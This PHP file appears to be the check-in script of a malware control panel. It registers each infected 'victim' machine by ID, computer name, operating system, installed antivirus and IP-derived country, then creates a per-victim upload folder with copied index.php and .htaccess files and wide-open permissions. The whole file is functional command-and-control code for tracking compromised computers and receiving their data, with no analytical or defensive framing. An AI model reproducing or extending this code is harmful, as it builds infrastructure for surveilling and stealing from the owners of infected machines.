<?php
include 'classes/Database.php';
include 'classes/Clients.php';

$client = new Clients;

$victimID = isset($_GET['vicID']) ? $_GET['vicID']: '';
$ipaddress = $_SERVER['REMOTE_ADDR'];
$cpname = isset($_GET['cpname']) ? $_GET['cpname']: '';
$contery = getConteryCode($ipaddress);
$os =  isset($_GET['os']) ? $_GET['os']: '';
$date = date("Y-m-d");
$antivirus =  isset($_GET['antivirus']) ? $_GET['antivirus']: '';
$status =  isset($_GET['status']) ? $_GET['status']: '';

$client->newClient($victimID,$ipaddress,$cpname,$contery,$os,$date,$antivirus,$status);

new_dir($victimID);

function getConteryCode($ipaddress) {
   $json = file_get_contents('http://www.geoplugin.net/json.gp?ip='.$ipaddress); 
   $data = json_decode($json);
   if ($data->geoplugin_countryCode == "") {
       return "X";
   } else {
       return strtolower($data->geoplugin_countryCode);
   }
}

function new_dir($victimID){
 try {
    mkdir("upload/$victimID");
    copy("upload/index.php", "upload/$victimID/index.php");
    copy("upload/.htaccess", "upload/$victimID/.htaccess");
    chmod("upload/$victimID", 7777);
  } catch (Exception $e) {
      return $e->getMessage();
  }

}
?>